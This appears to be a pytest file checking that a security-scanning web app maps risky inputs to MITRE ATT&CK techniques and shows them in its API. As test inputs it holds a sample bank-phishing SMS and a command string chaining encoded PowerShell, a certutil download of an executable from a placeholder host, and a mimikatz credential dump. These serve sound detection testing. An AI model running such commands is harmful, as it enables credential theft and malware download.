"""MITRE ATT&CK mapping: techniques are attached to risky scans, explained, and shown in the API."""
import uuid

from helpers import login_user, register_user


def _scan(client, module, sub, text=None, url=None):
    data = {"moduleId": module, "subtopicId": sub, "subtopicTitle": sub}
    if text:
        data["textInput"] = text
    if url:
        data["urlInput"] = url
    r = client.post("/api/analysis/scan", data=data)
    assert r.status_code == 200, r.text
    return r.json()


def test_catalogue_entries_are_complete():
    from app.services import mitre
    for tid, (name, tactic, expl) in mitre.CATALOGUE.items():
        assert tid.startswith("T") and name and tactic and len(expl) > 30
    assert mitre.url_for("T1566.002") == "https://attack.mitre.org/techniques/T1566/002/"


def test_safe_results_get_no_techniques():
    from app.services import mitre
    r = {"classification": "safe", "indicators": [{"triggered": True, "label": "x", "mitre": "T1110"}]}
    assert mitre.map_result("credential", "failed-logins", r) == []


def test_sms_phishing_maps_to_mobile_phishing_with_explanation(auth_client):
    res = _scan(auth_client, "phishing", "sms-analysis",
                text="Dear SBI customer your YONO account will be blocked today. Update PAN at http://sbi-kyc-update.top/login")
    ids = [m["id"] for m in res["mitreAttack"]]
    assert "T1660" in ids
    t = next(m for m in res["mitreAttack"] if m["id"] == "T1660")
    assert t["name"] and t["tactic"] and t["explanation"] and t["url"].startswith("https://attack.mitre.org/")


def test_cyber_threat_commands_map_to_specific_techniques(auth_client):
    res = _scan(auth_client, "cyber-threat", "malware-detection",
                text="powershell.exe -NoP -enc SQBFAFgA ; certutil -urlcache -f http://x/a.exe a.exe ; mimikatz sekurlsa::logonpasswords")
    ids = {m["id"] for m in res["mitreAttack"]}
    assert {"T1003.001", "T1059.001", "T1105"} <= ids
    assert res["classification"] in ("high_risk", "critical")
    tagged = [i for i in res["indicators"] if i["triggered"] and i["mitre"]]
    assert tagged


def test_scan_history_detail_and_summary_show_mitre(auth_client):
    res = _scan(auth_client, "url-security", "lookalike-domain", url=f"http://sbi-kyc-{uuid.uuid4().hex[:5]}.top/login")
    detail = auth_client.get(f"/api/scans/{res['scanId']}").json()
    assert [m["id"] for m in detail["mitreAttack"]] == [m["id"] for m in res["mitreAttack"]]
    assert "T1566.002" in [m["id"] for m in detail["mitreAttack"]]
    summ = auth_client.get("/api/mitre/summary?days=7").json()
    assert summ["mappedScans"] >= 1 and any(t["id"] == "T1566.002" and t["count"] >= 1 for t in summ["techniques"])
    assert summ["tactics"]
    assert len(auth_client.get("/api/mitre/techniques").json()) >= 30


def test_incident_lists_mitre(auth_client):
    _scan(auth_client, "cyber-threat", "malware-detection", text="mimikatz sekurlsa::logonpasswords and powershell -enc AAAA")
    rows = auth_client.get("/api/incidents?status=all&limit=50").json()
    assert any(any(m["id"] == "T1003.001" for m in r["mitre"]) for r in rows)


def test_mitre_summary_is_private(client):
    register_user(client, {"name": "M", "email": f"m_{uuid.uuid4().hex[:6]}@example.com", "password": "TestPass123"})
    assert client.get("/api/mitre/summary").json()["techniques"] == []
